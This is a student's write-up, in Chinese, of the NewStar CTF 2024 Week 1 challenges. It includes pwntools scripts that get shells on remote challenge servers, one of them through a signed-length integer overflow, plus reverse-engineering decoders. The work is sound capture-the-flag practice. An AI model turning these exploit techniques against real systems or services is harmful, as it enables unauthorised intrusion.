# NS24_Week1_CrazyCat_20233001236_刘涵
## 信息
- 平台ID：CrazyCat
- 姓名：刘涵
- 学号：20233001236
- 轮次：Week1
## 解出题目
![[Pasted image 20240929131422.png]]
![[Pasted image 20240929131459.png]]
![[Pasted image 20240929122557.png]]
(2024.9.29)

# PWN

## Real Login
![[Pasted image 20240929115710.png]]
`fun`函数中可以看出输入的`v3`等于`password`时即可运行`win`函数获取`shell`
![[Pasted image 20240929115811.png]]
可以看到`password`的内容为'NewStar!!!'，输入获取`shell`
![[Pasted image 20240929115852.png]]

## Game
![[Pasted image 20240929115948.png]]
`game`函数中可以看出输入的`v0`在(0,10)的范围内,
构造循环输入直到`v1>999`即可
exp:
```python
# 一次跑不通就多跑几次
from pwn import *

# context(arch='amd64', os='linux', log_level='debug')
local = False
if local:
    p = process('./game')
else:
    p = remote('39.106.48.123', 26563)

v1 = 0

while v1 <= 999:
    p.recvuntil(b'num: ')
    p.sendline(b'10')
    v1 += 10
    print(v1)

print(v1)
p.interactive()
```
运行获取`shell`
![[Pasted image 20240929120213.png]]

## overwrite
![[Pasted image 20240929120552.png]]
当`v4`中的字符转为整数后大于114514时即可获取`shell`,正常输入时最大输入48个数，既0x30长度，刚好无法覆盖v4
![[Pasted image 20240929120941.png]]
![[Pasted image 20240929120950.png]]
我们可以发现v2的定义为有符号的整数，在read时会将v2转为无符号整数，此处有整数溢出，故可以输入一个负数，在read时即可read超出0x30数量的字符
exp:
```python
from pwn import *

context(arch='amd64', os='linux', log_level='debug')    
local = True
if local:
    p = process('./overwrite')
else:
    p = remote('8.147.132.32', 41160)

p.recvuntil(b'readin: ')
p.sendline(b'-1')
p.recvuntil(b'say: ')

payload = b'a' * 0x30
payload += b'114515'

p.sendline(payload)
p.interactive()
```
![[Pasted image 20240929121418.png]]

## gdb
![[Pasted image 20240929121602.png]]
题意为将``v10``的数据按某种规则加密，我们输入的字符与加密后的字符一致即可获取`shell`
在`gdb`中可以看到加密前的数据为`0d000721`
![[Pasted image 20240929121931.png]]![[Pasted image 20240929122007.png]]
数据加密后为`0x4557455355431d5d`,输入即可
exp:
```python
import struct
from pwn import *

encrypted = 0x4557455355431d5d

local = False
if local:
    p = process('./gdb1')
    pwnlib.gdb.attach(p, 'b printf')
else:
    p = remote('8.147.132.32', 12202)

p.recvuntil(b'encrypted data: ')

byte_array = struct.pack('>Q', encrypted)

p.sendline(byte_array[::-1])
p.interactive()
```
![[Pasted image 20240929122151.png]]

# RE

## begin
考验对ida的使用
![[Pasted image 20240929123535.png]]
双击`flag_part1`，然后选中`db`按`a`可以获取第一部分`flag`
![[Pasted image 20240929123426.png]]
`shift+F12`,查看所有字符，可以找到第二部分`flag`
![[Pasted image 20240929123640.png]]
双击此处
![[Pasted image 20240929123716.png]]
![[Pasted image 20240929123745.png]]
然后选中对应的名称按`x`
![[Pasted image 20240929123804.png]]
跳转到对应的函数
![[Pasted image 20240929123824.png]]
可获取第三部分`flag`
三部分组合起来即为`flag`
![[Pasted image 20240929123854.png]]

## Simple_encryption
![[Pasted image 20240929124036.png]]
可以看出，函数将我们输入的`input`加密后与`buffer`进行比较，若一样则返回"success!",我们将`buffer`中的内容解密即为`flag`
双击buffer查看内容:
![[Pasted image 20240929124312.png]]
往exp中输入即可：
``` c++
#include <iostream>
using namespace std;

int main()
{
    char input[32]; 
    int len = 32;
    int i, j, k;
    unsigned int hexInput;

    puts("please input your flag (in hex format, e.g., 0x41):");
    for (i = 0; i < len; ++i)
    {
        scanf("%x", &hexInput);  // 读取十六进制输入
        input[i] = static_cast<char>(hexInput);  // 将输入转换为字符
    }

    for (j = 0; j < len; ++j)
    {
        if (!(j % 3))
            input[j] += 31;
        if (j % 3 == 1)
            input[j] -= 41;
        if (j % 3 == 2)
            input[j] ^= 0x55u;
    }

    for (k = 0; k < len; ++k)
    {
        printf("%c", input[k]);
        // printf("0x%02x ", input[k]);
    }
    putchar(10);
    printf("success!");
    return 0;
}
```
![[Pasted image 20240929124429.png]]

## base64
![[Pasted image 20240929124641.png]]
![[Pasted image 20240929124912.png]]
找到主函数并查看所有字符串可以发现内有一串base64加密后的数据，并且索引表为自定义的，可写出解密函数:

```python
import base64

def decode_custom_base64(encoded_str, custom_table):
    # 标准 base64 索引表
    standard_table = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
    # 创建转换表
    translation_table = str.maketrans(custom_table, standard_table)
    # 将自定义 base64 编码字符串转换为标准 base64 编码字符串
    translated_str = encoded_str.translate(translation_table)
    # 解码 base64 字符串
    decoded_bytes = base64.b64decode(translated_str)
    # 尝试使用 'latin-1' 编码解码字节序列
    decoded_str = decoded_bytes.decode('latin-1')
    return decoded_str

# 自定义索引表
custom_table = "WHydo3sThiS7ABLElO0k5trange+CZfVIGRvup81NKQbjmPzU4MDc9Y6q2XwFxJ/"

# 测试解码器
encoded_str = "g84Gg6m2ATtVeYqUZ9xRnaBpBvOVZYtj+Tc="
decoded_str = decode_custom_base64(encoded_str, custom_table)
print(decoded_str)
```
运行后获取flag
![[Pasted image 20240929125109.png]]

## ez_debug
一道练习如何使用xdbg的题，不知道有没有更好的方法，我只是在步进的过程中发现flag就在调试过程中
![[Pasted image 20240929125735.png]]

## ezAndroidStudy
一道练习apk的题，模拟器中安装apk后跟着他走就行
### part1:
用jadx打开apk，找到AndroidManifest.xml
![[Pasted image 20240929130505.png]]
找到activity
![[Pasted image 20240929130537.png]]
双击homo进入
![[Pasted image 20240929130602.png]]
找到part1
### part2
根据提示找到part2
![[Pasted image 20240929130803.png]]
### part3
根据提示，在layout的activity_main中可以找到part3
![[Pasted image 20240929130939.png]]
### part4
在raw中找到part4
![[Pasted image 20240929131009.png]]
### part5
将apk解压，找到lib中的so文件（x86,x86-64皆可)
![[Pasted image 20240929131124.png]]
在ida中打开，即可找到part5
![[Pasted image 20240929131210.png]]
### 拼凑
拼凑五个part即可获取flag
![[Pasted image 20240929131254.png]]
